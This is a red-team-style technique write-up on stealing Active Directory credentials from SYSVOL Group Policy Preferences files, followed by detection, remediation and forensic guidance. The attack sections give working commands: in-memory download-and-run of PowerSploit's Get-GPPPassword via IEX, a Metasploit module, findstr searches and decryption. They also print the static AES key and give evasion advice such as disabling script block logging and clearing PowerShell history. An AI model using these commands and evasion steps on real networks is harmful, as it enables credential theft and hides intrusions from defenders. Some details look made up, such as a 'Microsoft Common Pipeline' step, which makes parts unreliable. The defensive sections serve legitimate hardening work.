# CA-UNSC-003: SYSVOL GPP Credential Extraction

## 1. METADATA & CLASSIFICATION

| Field | Value |
|-------|-------|
| **Technique ID** | CA-UNSC-003 |
| **Technique Name** | SYSVOL GPP credential extraction |
| **MITRE ATT&CK** | T1552.006 |
| **CVE** | CVE-2014-1812 |
| **Environment** | Windows Active Directory (Domain-joined systems) |
| **Tactic** | Credential Access (TA0006) |
| **Data Source** | File: File Access (DC0029) |
| **Technique Status** | ACTIVE - Legacy vulnerability affecting unpatched domains |
| **Last Verified** | January 2026 |
| **Affected Versions** | Windows Server 2008 SP2 through 2022 (unpatched GPP policies) |
| **Patched In** | MS14-025 (May 2014) - Prevents new policies; existing policies remain exploitable |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

Group Policy Preferences (GPP) is a legitimate Windows feature that allows domain administrators to deploy passwords, drive mappings, scheduled tasks, and services across the domain. A critical flaw in how these credentials are encrypted allows any authenticated domain user to decrypt stored passwords. The encryption uses a static, publicly available AES-256 key published by Microsoft. While MS14-025 (May 2014) prevents creation of new password policies, it does not remove existing vulnerable policies from SYSVOL. This technique remains one of the most common initial privilege escalation vectors in Active Directory environments.

**Risk Level**: CRITICAL  
**Exploitability**: Very High  
**Detection Difficulty**: Low (high network/process visibility)

---

## 3. ATTACK NARRATIVE

### Initial Foothold Phase
An attacker with basic domain user credentials (or unauthenticated network access via compromised endpoint) accesses the SYSVOL share on a domain controller. The SYSVOL share is readable by all Authenticated Users by default. The attacker enumerates XML files containing Group Policy objects, specifically targeting files known to store credentials:
- `Groups.xml` (local account creation/modification)
- `Services.xml` (service account credentials)
- `ScheduledTasks.xml` (task scheduler credentials)
- `DataSources.xml` (ODBC credentials)
- `Drives.xml` (mapped drive credentials)
- `Printers.xml` (printer configuration credentials)

### Exploitation Phase
The attacker identifies XML files containing the `cpassword` attribute—an AES-256 encrypted password field. Using publicly available tools (PowerSploit, Metasploit, or custom scripts), the attacker decrypts the password using Microsoft's hardcoded AES key and derives plaintext credentials. These credentials typically grant access to high-value accounts such as:
- Local Administrator accounts
- Service accounts with elevated privileges
- Domain service accounts
- Build/deployment service accounts

### Privilege Escalation Phase
With plaintext credentials obtained from GPP, the attacker uses these credentials to:
1. Gain administrative access to multiple systems via the distributed local administrator password
2. Pivot laterally within the network using service account credentials
3. Establish persistence via compromised administrative accounts
4. Escalate to Domain Admin or Enterprise Admin by targeting administrative service accounts

---

## 4. TECHNICAL FOUNDATION

### Architecture & Mechanism

**SYSVOL Structure**:
```
\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\{GUID}\
  ├── Machine\
  │   └── Preferences\
  │       ├── Groups\Groups.xml
  │       ├── Services\Services.xml
  │       ├── ScheduledTasks\ScheduledTasks.xml
  │       ├── DataSources\DataSources.xml
  │       └── Drives\Drives.xml
  └── User\
      └── Preferences\
          ├── Control Panel Settings\
          └── Windows Settings\
```

**GPP Password Storage**:
- Passwords stored in XML `<Properties>` elements with attribute `cpassword`
- Example: `<Properties action="U" newName="[BLANK]" fullName="Local Administrator" cpassword="gtTqxKHj4RWsxHWcZcWtM8j7XbxiL7w+..." userName="Administrator" />`
- `cpassword` value is Base64-encoded AES-256 ciphertext with IV set to null bytes

**AES Encryption Details**:
- **Algorithm**: AES-256 (256-bit key)
- **Mode**: CBC (Cipher Block Chaining)
- **IV**: 16 null bytes (0x00 × 16)
- **Key (32 bytes)**: 
  ```
  4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8
  f1 d3 f1 d2 d0 cf d0 d4 cc ca cc ca d0 cc ca cc
  ```
- **Status**: PUBLICLY AVAILABLE on Microsoft documentation

**Decryption Process**:
1. Base64-decode `cpassword` value
2. Initialize AES object with hardcoded key and null IV
3. Decrypt binary data to plaintext password
4. Integrity validation via successful decryption (no authentication mechanism)

---

## 5. PREREQUISITES FOR EXPLOITATION

### Attacker Requirements
- ✓ Network access to domain controller (TCP 445 SMB or SMB3)
- ✓ Valid domain user credentials OR unauthenticated access (with endpoint compromise)
- ✓ PowerShell execution rights (for PowerSploit) OR Metasploit framework access
- ✓ Basic understanding of Active Directory and GPO structure

### Environmental Conditions
- ✓ One or more GPP policies configured with embedded credentials (created before May 2014)
- ✓ Patch MS14-025 NOT applied to domain controllers (or patches applied but old policies not removed)
- ✓ SYSVOL share accessible (default: accessible to Authenticated Users)
- ✓ No additional SYSVOL access restrictions via NTFS permissions
- ✓ Domain controller running Windows Server 2008 SP2 or later

### Tool Availability
- PowerSploit Get-GPPPassword.ps1 module (GitHub: PowerShellMafia/PowerSploit)
- Metasploit Framework (post/windows/gather/credentials/gpp module)
- gpprefdecrypt.py (Python-based standalone decryption)
- Native Windows findstr.exe command

---

## 6. ATTACK EXECUTION METHODS

### Method 1: PowerSploit - Get-GPPPassword (Remote DC)

**Description**: Use PowerSploit module to enumerate and decrypt GPP passwords directly from domain controller SYSVOL.

**Command**:
```powershell
# Download and import PowerSploit module
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')

# Execute to find and decrypt all GPP passwords in domain
Get-GPPPassword -Verbose

# Example output:
# Changed   : {2023-09-15 10:30:00}
# UserNames : {Administrator}
# NewName   : [BLANK]
# Passwords : {P@ssw0rd123!}
# File      : \\domain.com\SYSVOL\domain.com\Policies\{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}\Machine\Preferences\Groups\Groups.xml
# NodeName  : Groups
```

**Prerequisites**:
- Domain-joined system OR network connectivity to domain controller
- PowerShell execution policy allowing script download (or bypass via ExecutionPolicy)
- SMB access to SYSVOL share (TCP 445)

**Version Support**:
- Windows Server 2008 SP2+
- Windows Server 2012, 2012 R2, 2016, 2019, 2022 (all affected if policies exist)
- Works against patched servers if old policies remain

---

### Method 2: PowerSploit - Get-CachedGPPPassword (Local Endpoint)

**Description**: Search local endpoint for cached GPP XML files (created when endpoint processes GPP policies).

**Command**:
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')

# Search local machine for cached GPP files
Get-CachedGPPPassword -Verbose

# Searches:
# C:\ProgramData\Microsoft\Group Policy\History\*\Machine\Preferences\Groups\Groups.xml
# C:\ProgramData\Microsoft\Group Policy\History\*\Machine\Preferences\Services\Services.xml
# C:\Windows\System32\GroupPolicy\Machine\Preferences\Groups\Groups.xml (older Windows versions)
```

**Prerequisites**:
- System already received GPP policy (cached locally)
- No domain connectivity required
- Local administrator or SYSTEM privilege helpful for accessing cached files

---

### Method 3: Metasploit - post/windows/gather/credentials/gpp

**Description**: Metasploit post-exploitation module for automated GPP enumeration and decryption.

**Commands**:
```
meterpreter > use post/windows/gather/credentials/gpp
meterpreter > run session=-1

# Output includes:
# [+] Found credentials in \\DOMAIN\SYSVOL\...\Groups.xml
# [+] UserName: Administrator
# [+] Password: P@ssw0rd123!
# [+] File: \\DOMAIN\SYSVOL\domain.com\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
```

**Prerequisites**:
- Active Meterpreter session on compromised system
- Session running as SYSTEM or domain user context
- SMB access to domain controller

---

### Method 4: Manual SYSVOL Enumeration with Findstr

**Description**: Use native Windows command to search SYSVOL for `cpassword` values without external tools.

**Commands**:
```cmd
# List logon server
echo %logonserver%

# Search for cpassword in SYSVOL
findstr /S cpassword %logonserver%\sysvol\*.xml

# Example output:
# \\DC01\sysvol\domain.com\Policies\{A1B2C3D4-E5F6}\Machine\Preferences\Groups\Groups.xml:
#   <Properties action="U" newName="[BLANK]" fullName="Local Administrator" cpassword="gtTqxKHj4RWsxHWcZcWtM8j7XbxiL7w+SwIyQbAetjEUfqBg2HmTklEXlDHuQPgE3NyuCKZ9Nu3oeXaeSt+9JQ==" userName="Administrator" />

# Extract base64 cpassword value (e.g., gtTqxKHj4RWsxHWcZcWtM8j7XbxiL7w+SwIyQbAetjEUfqBg2HmTklEXlDHuQPgE3NyuCKZ9Nu3oeXaeSt+9JQ==)
# Then decrypt using gpprefdecrypt.py or online decoder
```

**Prerequisites**:
- Command prompt/PowerShell access
- Domain-joined system with access to SYSVOL
- Must have permissions to read SYSVOL (default: Authenticated Users)

---

### Method 5: gpprefdecrypt.py - Python-Based Decryption

**Description**: Standalone Python tool for decrypting Base64-encoded cpassword values (requires manual extraction).

**Installation**:
```bash
git clone https://github.com/galoget/gpp-cpass-decrypt
cd gpp-cpass-decrypt
pip3 install -r requirements.txt
# OR
pip3 install gpp-cpass-decrypt
```

**Usage**:
```bash
# Decrypt single cpassword
python3 gpp_cpass_decrypt.py -c "gtTqxKHj4RWsxHWcZcWtM8j7XbxiL7w+SwIyQbAetjEUfqBg2HmTklEXlDHuQPgE3NyuCKZ9Nu3oeXaeSt+9JQ=="

# Output:
# Decrypted Password: P@ssw0rd123!

# Or using installed package:
gpp_cpass_decrypt -c "gtTqxKHj4RWsxHWcZcWtM8j7XbxiL7w+SwIyQbAetjEUfqBg2HmTklEXlDHuQPgE3NyuCKZ9Nu3oeXaeSt+9JQ=="
```

**Workflow**:
1. Manually search SYSVOL for XML files with `cpassword` attribute
2. Extract Base64-encoded `cpassword` value
3. Decrypt using this tool
4. Obtain plaintext credentials

---

## 7. COMMAND EXECUTION & VALIDATION

### Validation Test 1: Verify SYSVOL Access

```powershell
# Test 1a: Check SYSVOL accessibility
Test-Path "\\$env:USERDNSDOMAIN\SYSVOL"

# Expected output if accessible: True
# Expected output if not accessible: False

# Test 1b: List GPO folders
Get-ChildItem "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies" | Select-Object Name

# Expected output: List of GUID folders like {A1B2C3D4-E5F6-7890-ABCD-EF1234567890}

# Test 1c: Search for Groups.xml files
Get-ChildItem -Path "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies" -Recurse -Filter "Groups.xml" | Select-Object FullName

# Expected output: File paths to Groups.xml files if they exist
```

### Validation Test 2: PowerSploit Execution

```powershell
# Test 2a: Check if PowerSploit can be downloaded
$url = 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1'
$response = Invoke-WebRequest $url -UseBasicParsing
if ($response.StatusCode -eq 200) { Write-Host "PowerSploit accessible: YES" } else { Write-Host "PowerSploit accessible: NO" }

# Test 2b: Execute Get-GPPPassword with verbose output
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')
Get-GPPPassword -Verbose

# Expected output: 
# If vulnerable GPPs exist: Decrypted passwords displayed
# If no GPPs: "No preference files found"
```

### Validation Test 3: Manual XML Inspection

```powershell
# Test 3: Inspect XML content directly
$gpoPath = "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml"
[xml]$xmlContent = Get-Content $gpoPath
$xmlContent.Groups.User | Where-Object { $_.cpassword } | Select-Object userName, cpassword, newName

# Expected output:
# userName        : Administrator
# cpassword       : gtTqxKHj4RWsxHWcZcWtM8j7XbxiL7w+...
# newName         : [BLANK]
```

---

## 8. EXPLOITATION SUCCESS INDICATORS

A successful exploitation of CA-UNSC-003 is confirmed when:

✓ Plaintext password retrieved from `cpassword` field  
✓ Password corresponds to domain account or local administrator account  
✓ Password confirmed valid via alternative authentication method (e.g., RDP, SMB authentication)  
✓ Extracted password allows lateral movement or privilege escalation  
✓ Credentials grant access to high-value systems or accounts  

**Quantifiable Success Metrics**:
- Number of plaintext passwords extracted
- Privilege level of accounts compromised (Local Admin vs. Domain Admin vs. Service Accounts)
- Number of systems affected by distributed credentials
- Time to privilege escalation following extraction

---

## 9. EVASION & OPERATIONAL SECURITY (OPSEC)

### Evasion Techniques

**1. Legitimate Administrative Tools**
- Use native `findstr.exe` instead of PowerSploit to avoid script detection
- Execute Get-GPPPassword from legitimately installed PowerShell modules
- Blend with scheduled domain queries using Group Policy Analysis cmdlets

**2. Timing & Frequency**
- Execute during normal business hours when SYSVOL queries are common
- Distribute queries over time rather than bulk enumeration
- Space out multiple queries to avoid rate-limiting detection

**3. Source Obfuscation**
- Execute from domain controller or administrative workstation (expected traffic)
- Use VPN or legitimate domain credentials to access SYSVOL
- Tunnel SMB traffic through legitimate DNS or HTTP proxies

**4. Log Minimization**
- Disable PowerShell script block logging before execution
- Use PowerShell `-NoProfile` and `-NonInteractive` flags
- Execute within constrained PowerShell runspaces to avoid logging

**5. Artifact Cleanup**
- Remove downloaded PowerSploit scripts from cache
- Clear PowerShell history: `Remove-Item (Get-PSReadlineOption).HistorySavePath`
- Delete temporary XML copies from local system

### OPSEC Risk Factors

⚠️ **High Risk**:
- Direct SMB enumeration from external network (anomalous source)
- PowerShell script block logging enabled (reveals full command)
- Large-scale SYSVOL access from single endpoint
- Tool signatures (Get-GPPPassword, gpprefdecrypt)

⚠️ **Medium Risk**:
- Findstr.exe with `/S` recursive flag (legitimate but unusual frequency)
- PowerSploit module import in memory (detectable via memory scanning)
- Failed authentication attempts preceding successful SYSVOL access

⚠️ **Low Risk**:
- SYSVOL access during normal business hours by domain user
- Manual XML parsing on local endpoint (difficult to distinguish from legitimate admin activity)
- Native command execution (findstr) on domain-joined system

---

## 10. IMPACT & BLAST RADIUS

### Direct Impact
- **Plaintext credentials** for 1-N accounts obtained
- **Lateral movement** enabled across systems receiving the GPP policy
- **Privilege escalation** to local administrator on affected systems
- **Persistence** established via compromised administrative accounts

### Indirect Impact
- **Service account compromise** leading to application-level access (databases, web services)
- **Domain escalation** if compromised service accounts have delegated privileges
- **Backup system compromise** if backup service accounts are distributed via GPP
- **Compliance violations** (HIPAA, PCI-DSS, SOC2) due to plaintext credential exposure

### Blast Radius Calculation
```
Blast Radius = (Number of Systems Receiving Policy) × (Criticality of Account) × (Account Usage Scope)

Example:
- GPP distributed to 500 workstations with Local Admin password
- Local Admin account has remote logon rights (RDP, WinRM enabled)
- Accounts used for shared service access
- Result: 500+ systems directly compromised + cascading access to services
```

---

## 11. DEFENSE MECHANISMS

### Detection at Exploitation Boundary

**Network-Level Detection**:
- Monitor SMB traffic to SYSVOL share from unusual sources
- Alert on recursive directory enumeration in SYSVOL folder
- Flag XML file parsing from non-administrative endpoints
- Baseline normal SYSVOL access patterns per endpoint

**Process-Level Detection**:
- Monitor PowerShell script block execution containing "cpassword" patterns
- Alert on AES decryption logic in PowerShell scripts
- Detect Metasploit module loading (post/windows/gather/credentials/gpp)
- Flag execution of gpprefdecrypt tools or variants

**Host-Level Detection**:
- Windows Event ID 4625 (failed logon) + 4624 (successful logon) sequence anomalies
- PowerShell Operational logs (Event ID 4104) showing XML parsing and AES operations
- File access logs (Audit File System) for SYSVOL XML files
- Network shares accessed (Event ID 5140, 5145)

### Defense Mechanisms Summary

| Mechanism | Type | Effectiveness | Implementation Complexity |
|-----------|------|-----------------|---------------------------|
| SYSVOL NTFS Permissions Hardening | Preventive | High | Medium |
| Disable GPP on Modern Systems | Preventive | Medium | Low |
| MS14-025 + Remove Old Policies | Preventive | High | Medium |
| PowerShell Script Block Logging | Detective | High | Low |
| SMB Signing Enforcement | Detective | Low | Medium |
| SYSVOL Access Baselining | Detective | Medium | High |

---

## 12. REMEDIATION & MITIGATION

### Immediate Mitigation (0-24 hours)

**Step 1: Identify Vulnerable GPPs**
```powershell
# Run Microsoft's detection script
# Download: https://support.microsoft.com/en-us/help/2962486
# Or use PowerShell alternative:

$sysvol = "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies"
Get-ChildItem -Path $sysvol -Recurse -Include "Groups.xml","Services.xml","ScheduledTasks.xml" -ErrorAction SilentlyContinue | ForEach-Object {
    [xml]$xml = Get-Content $_
    if ($xml.Groups.User.cpassword) {
        Write-Host "VULNERABLE: $($_.FullName)"
        Write-Host "Account: $($xml.Groups.User.userName)"
    }
}
```

**Step 2: Reset Compromised Accounts**
```powershell
# Reset Local Administrator password on all affected systems
# Example (requires GPP or other distribution method):
net user Administrator NewSecurePassword123!

# For multiple systems, use Configuration Manager or MDM
```

**Step 3: Isolate Compromised Credentials**
```
- Change local administrator password on ALL systems
- Reset service account passwords in Active Directory
- Revoke/rotate API keys and secrets (if exposed in GPP)
```

### Short-Term Mitigation (1-7 days)

**Step 4: Apply MS14-025 Patch (KB2962486)**
```powershell
# Check patch status
Get-HotFix -Id KB2962486

# Expected output if patched:
# Source        Description            HotFixID   InstalledBy       InstalledDate
# ------        -----------            --------   -----------       -------
# DC01          Security Update        KB2962486  DOMAIN\Administrator  1/15/2023

# Deploy via WSUS or Microsoft Update Catalog
# Or manually: wusa Windows6.1-KB2962486-x64.msu /quiet /norestart
```

**Step 5: Remove Vulnerable GPP Policies**
- Manual GUI method:
  ```
  1. Open Group Policy Management Console (gpmc.msc)
  2. Navigate to Policies folder
  3. For each GPO with embedded credentials:
     a. Open GPO for editing
     b. Locate Preferences with cpassword
     c. Set action to "Delete" or "Disable"
     d. Save and wait for replication
     e. Monitor client systems for 2-3 Group Policy refresh cycles
     f. Delete the preference entirely once confirmed
  ```

- PowerShell method:
  ```powershell
  # Using Group Policy PowerShell module
  Get-GPO -All | ForEach-Object {
      $gpoPath = (Get-GPOReport -Guid $_.Id -ReportType Xml).OuterXml
      if ($gpoPath -match 'cpassword') {
          Write-Host "VULNERABLE GPO: $($_.DisplayName) ($($_.Id))"
      }
  }
  ```

### Long-Term Remediation (1-3 months)

**Step 6: Implement LAPS (Local Administrator Password Solution)**
```powershell
# Deploy LAPS to replace GPP password management

# 1. Install LAPS management tools on admin workstations
# Download: https://www.microsoft.com/en-us/download/details.aspx?id=46899

# 2. Configure Group Policy for LAPS
# Policy: Computer Configuration > Policies > Administrative Templates > LAPS
# Settings:
#   - Enable Local admin password management: ENABLED
#   - Password length: 20+ characters
#   - Password age (days): 30
#   - Password complexity: Enabled

# 3. Grant retrieval permissions to authorized admins
# Script example:
Import-Module ActiveDirectory
$adminGroup = Get-ADGroup "Domain Admins"
$gpoCName = "LAPS-Deployment"
# ... NTFS permission assignment
```

**Step 7: Implement MCP (Microsoft Common Pipeline)**
```powershell
# For Azure-connected scenarios, use Intune/Entra ID LAPS
# Requires:
# - Azure AD Connect Health
# - Windows 10 21H2+ or Windows 11
# - Entra ID Premium

# Configure via Intune:
# Devices > Compliance > Create policy > Windows 10+
# Mitigation: Local Administrator Password Solution (LAPS)
```

**Step 8: RBAC & ABAC Hardening**
```powershell
# Restrict who can manage Group Policy Preferences
# Option A: Remove GPP creation rights
# Policy: Computer Configuration > Policies > Administrative Templates > System > Group Policy
#   Setting: "Allow creation of new Group Policy preferences": DISABLED

# Option B: Delegate GPO editing to specific admins
# ADUC Method:
# 1. Open ADUC
# 2. Navigate to domain
# 3. Right-click Policies OU
# 4. Delegate Control → Select admins → Grant "Manage Group Policy links"
```

### Validation Command (Verify Fix)

```powershell
# After remediation, validate:

# Test 1: Verify no cpassword attributes remain
$sysvol = "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies"
$foundVulnerable = $false
Get-ChildItem -Path $sysvol -Recurse -Include "*.xml" | ForEach-Object {
    [xml]$xml = Get-Content $_
    if ($xml.InnerXml -match 'cpassword') {
        Write-Host "VULNERABLE FOUND: $($_.FullName)"
        $foundVulnerable = $true
    }
}
if (!$foundVulnerable) { Write-Host "✓ No vulnerable GPPs detected" }

# Test 2: Verify MS14-025 applied
if (Get-HotFix -Id KB2962486 -ErrorAction SilentlyContinue) {
    Write-Host "✓ MS14-025 patch applied"
} else {
    Write-Host "✗ MS14-025 patch NOT applied - REMEDIATION INCOMPLETE"
}

# Test 3: Verify LAPS deployed (if implemented)
Get-GPO -All | ForEach-Object {
    if ((Get-GPOReport -Guid $_.Id -ReportType Xml) -match "LAPS") {
        Write-Host "✓ LAPS found in GPO: $($_.DisplayName)"
    }
}
```

**Expected Output (If Secure)**:
```
✓ No vulnerable GPPs detected
✓ MS14-025 patch applied
✓ LAPS found in GPO: LAPS-Deployment
```

**What to Look For**:
- No results from cpassword search (indicates all policies removed/cleaned)
- KB2962486 present in Get-HotFix output
- PowerShell version ≥ 5.1 (required for Get-GPOReport XML parsing)
- LAPS policies active in Group Policy Management Console

---

## 13. FORENSIC ANALYSIS & INCIDENT RESPONSE

### Forensic Artifacts & Collection

**On-Disk Artifacts**:
```
1. SYSVOL Directory (Primary):
   Path: C:\Windows\SYSVOL\domain\Policies\{GUID}\Machine\Preferences\
   Files: Groups.xml, Services.xml, ScheduledTasks.xml, DataSources.xml, Drives.xml, Printers.xml
   Evidence: Presence of cpassword attributes indicates vulnerability
   Timestamp: File modification time shows when policy was created/modified
   Preservation: Copy to evidence folder before any remediation

2. Group Policy Cache (Secondary):
   Path: C:\ProgramData\Microsoft\Group Policy\History\{GUID}\Machine\Preferences\
   Files: Same XML files as above (cached copies)
   Evidence: Indicates policy was processed by system
   Importance: May contain older versions of policies

3. MFT Journal & USN Journal:
   Path: $MFT on each volume
   Evidence: File access timestamps and modification records
   Analysis: Shows which users accessed SYSVOL XML files
   Tool: MFTECmd or Velociraptor

4. Windows Prefetch:
   Path: C:\Windows\Prefetch\*.pf
   Evidence: Execution history of PowerShell, Metasploit modules, gpprefdecrypt
   Files: POWERSHELL.EXE-*.pf, METERPRETER.EXE-*.pf
   Timeline: First/last execution times
```

**Event Log Artifacts**:
```
1. Security Event Log (C:\Windows\System32\winevt\Logs\Security.evtx):
   
   Event ID 5140 (Network share accessed):
   - Computer: Domain Controller
   - Object: \\DC\SYSVOL
   - User: Attacker account
   - Timestamp: When SYSVOL was accessed
   - Network info: Source IP address
   
   Event ID 5145 (Network share object accessed):
   - Details: Which files accessed (Groups.xml, etc.)
   - Timestamp: Precise timing of file access
   - Status: Success/Failure
   
   Event ID 4624 (Successful logon):
   - LogonType: 3 (Network)
   - SourceIP: Attacker machine
   - Account: Domain user account used
   - Timestamp: When attacker logged in

2. PowerShell Operational Log (Microsoft-Windows-PowerShell%4Operational.evtx):
   
   Event ID 4104 (Script block logging):
   - Content: Full PowerShell commands executed
   - Evidence: Get-GPPPassword function definition and execution
   - AES decryption code visible in script block
   - Timestamp: When commands were executed
   
   Event ID 4103 (Module logging):
   - Commands: PowerShell cmdlets used
   - Module: Exfiltration module name

3. Application Event Log:
   - Metasploit artifacts (if used)
   - Custom tool execution errors
   - Session establishment timestamps
```

**Memory Artifacts**:
```
1. LSASS.exe Memory (Local Security Authority):
   - Location: C:\Windows\System32\lsass.exe
   - Evidence: Plaintext credentials cached
   - Collection: procdump64.exe -ma lsass.exe memory.dmp
   - Analysis: Hash with mimikatz, find plaintext passwords

2. PowerShell Process Memory:
   - Location: PowerShell.exe process heap
   - Evidence: Decrypted passwords in memory
   - Collection: procdump64.exe -ma powershell.exe memory.dmp
   - Analysis: String search for decrypted passwords

3. Registry Memory (SAM):
   - File: C:\Windows\System32\config\SAM
   - Evidence: Hash values of reset accounts
   - Collection: Copy SAM and SYSTEM files
   - Analysis: Detect password change timestamps
```

**Network Artifacts**:
```
1. SMB Network Capture (PCAP):
   - Packets captured on network segment
   - Evidence: SMB protocol traffic to SYSVOL share
   - Indicators: \\DC\SYSVOL references, XML file names
   - Collection: tcpdump, Wireshark on network segment
   - Analysis: Identify source IPs, timing, frequency

2. DNS Query Logs:
   - Lookup of domain controller FQDN
   - Lookup of DOMAIN.COM for SYSVOL resolution
   - Evidence: When attacker resolved domain name
   - Collection: DNS server logs, Windows DNS event logs
```

### Evidence Collection Procedure

```powershell
# Step 1: Create evidence directory
$evidenceDir = "C:\Forensics\CA-UNSC-003_Evidence_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -ItemType Directory $evidenceDir -Force | Out-Null

# Step 2: Collect SYSVOL files
$sysvol = "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies"
Copy-Item -Path $sysvol -Destination "$evidenceDir\SYSVOL_Copy" -Recurse -Force

# Step 3: Collect event logs
wevtutil epl Security "$evidenceDir\Security.evtx"
wevtutil epl "Windows PowerShell" "$evidenceDir\PowerShell.evtx"

# Step 4: Collect registry (SAM/SYSTEM for password change timeline)
reg export HKLM\SAM "$evidenceDir\SAM.reg"
reg export HKLM\SECURITY "$evidenceDir\SECURITY.reg"

# Step 5: Collect MFT (if needed)
# Requires administrative tools; tool: MFTECmd.exe
MFTECmd.exe -f C:\$MFT -o "$evidenceDir\MFT_Analysis"

# Step 6: Document file hashes
Get-ChildItem -Path "$evidenceDir" -Recurse | ForEach-Object {
    "$($_.FullName) | $(Get-FileHash $_.FullName -Algorithm SHA256).Hash"
} | Out-File "$evidenceDir\FileHashes.txt"

Write-Host "Evidence collected to: $evidenceDir"
```

### Forensic Timeline & Analysis

**Timeline Reconstruction**:
```
1. T0: Policy Creation
   - Indicator: Groups.xml file creation timestamp in SYSVOL
   - Evidence: File metadata (born time, change time)
   - Significance: Shows when vulnerability was introduced

2. T1: Attacker Access to SYSVOL
   - Indicator: Event ID 5140, 5145 on domain controller
   - Evidence: Network logon (Event 4624) from attacker IP
   - Significance: Shows initial reconnaissance phase

3. T2: Credential Extraction
   - Indicator: PowerShell script block execution (Event 4104)
   - Evidence: Get-GPPPassword function execution logs
   - Significance: Shows point of compromise

4. T3: Credential Usage
   - Indicator: Logon attempts with extracted credentials
   - Evidence: Event 4624 (successful) or 4625 (failed attempts before success)
   - Significance: Shows lateral movement/privilege escalation

5. T4: Persistence Establishment
   - Indicator: New user creation, RDP service startup, etc.
   - Evidence: Event 4720 (user created), Event 1000 (service started)
   - Significance: Shows post-exploitation activities
```

---

## 14. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files**:
```
- C:\Windows\SYSVOL\domain\Policies\{*}\Machine\Preferences\Groups\Groups.xml
  (Contains cpassword attribute)
  
- C:\ProgramData\Microsoft\Group Policy\History\{*}\Machine\Preferences\*.xml
  (Cached policy files)
  
- C:\Windows\Temp\Get-GPPPassword.ps1
- C:\Windows\Temp\gpprefdecrypt.py
- C:\Users\*\Downloads\PowerSploit-*
- C:\Windows\System32\drivers\etc\hosts (modified for C2 or lateral movement)
```

**Registry**:
```
- HKLM\Software\Microsoft\Windows\CurrentVersion\Group Policy
  (May show policy processing artifacts)
  
- HKLM\System\CurrentControlSet\Services\EventLog\Security
  (Check for log clearing indicators)
  
- HKU\S-*-*-*\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
  (May show recent command history if PowerShell executed)
```

**Network**:
```
- TCP 445 to Domain Controller from non-standard source IP
- SMB protocol traffic with patterns:
  - Recursive directory listing in \SYSVOL\
  - File read of .XML files in Preferences folders
- DNS queries for DC FQDN or SYSVOL.domain.com
- NetBIOS queries for DC discovery
```

**Process**:
```
- powershell.exe with command-line containing:
  "Get-GPPPassword", "cpassword", "Import-Module", "IEX"
  
- cmd.exe executing:
  "findstr /S cpassword", "%logonserver%\sysvol"
  
- meterpreter.exe (Windows Defender signature)
  
- Python.exe executing gpprefdecrypt.py
```

### Response Procedures

#### 1. Isolate Compromised Systems

**Immediate Actions**:
```powershell
# Command method (requires RDP or Meterpreter session):
Disable-NetAdapter -Name "Ethernet" -Confirm:$false

# OR via PowerShell remote execution:
Invoke-Command -ComputerName "ComputerName" -ScriptBlock {
    Disable-NetAdapter -Name "Ethernet" -Confirm:$false
}
```

**Manual (Physical/Azure)**:
- Physical: Disconnect network cable or power off system
- Azure: Go to **Azure Portal** → **Virtual Machines** → Select VM → **Networking** → **Disconnect** NIC
- Hyper-V: Right-click VM → **Settings** → **Network Adapter** → **Not Connected**

#### 2. Collect Evidence

**Command Method**:
```powershell
# Export Security Event Log
wevtutil epl Security "C:\Evidence\Security.evtx"

# Capture memory dump of critical processes
# Requires: procdump64.exe (from Sysinternals)
procdump64.exe -ma lsass.exe "C:\Evidence\lsass.dmp"
procdump64.exe -ma powershell.exe "C:\Evidence\powershell.dmp"

# Export Group Policy files from SYSVOL
$sysvol = "\\DC01\SYSVOL\domain.com"
Copy-Item "$sysvol\Policies" -Destination "C:\Evidence\SYSVOL_Policies" -Recurse -Force

# Export SYSVOL from domain controller directly
Get-ChildItem "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies" -Recurse -Include "*.xml" | 
    Copy-Item -Destination "C:\Evidence\" -Force
```

**Manual Method**:
```
1. Open Event Viewer (eventvwr.exe)
2. Right-click "Security" log
3. Click "Save All Events As"
4. Choose location: C:\Evidence\Security.evtx
5. For PowerShell log:
   - Open: Applications and Services Logs > Microsoft > Windows > PowerShell > Operational
   - Right-click > Save All Events As > C:\Evidence\PowerShell.evtx
```

#### 3. Remediate

**Command Method**:
```powershell
# Stop attacker processes
Stop-Process -Name "powershell" -Force
Stop-Process -Name "meterpreter" -Force
Stop-Process -Name "python" -Force

# Remove malicious scripts from temp
Remove-Item "C:\Windows\Temp\Get-GPPPassword.ps1" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Windows\Temp\gpprefdecrypt.*" -Force -ErrorAction SilentlyContinue

# Reset passwords for extracted credentials
# For Local Admin (using alternative admin account):
net user Administrator "NewSecurePassword123!@#"

# For Domain accounts (requires domain admin):
Set-ADAccountPassword -Identity "ServiceAccount" -NewPassword (ConvertTo-SecureString "NewSecurePassword123!@#" -AsPlainText -Force)
```

**Manual Method**:
1. Open **Task Manager**
2. **Details** tab → Right-click suspicious process (powershell.exe, python.exe)
3. Select **End Task**
4. Open **File Explorer** → Navigate to temp folders
5. Delete PowerSploit and decryption tools
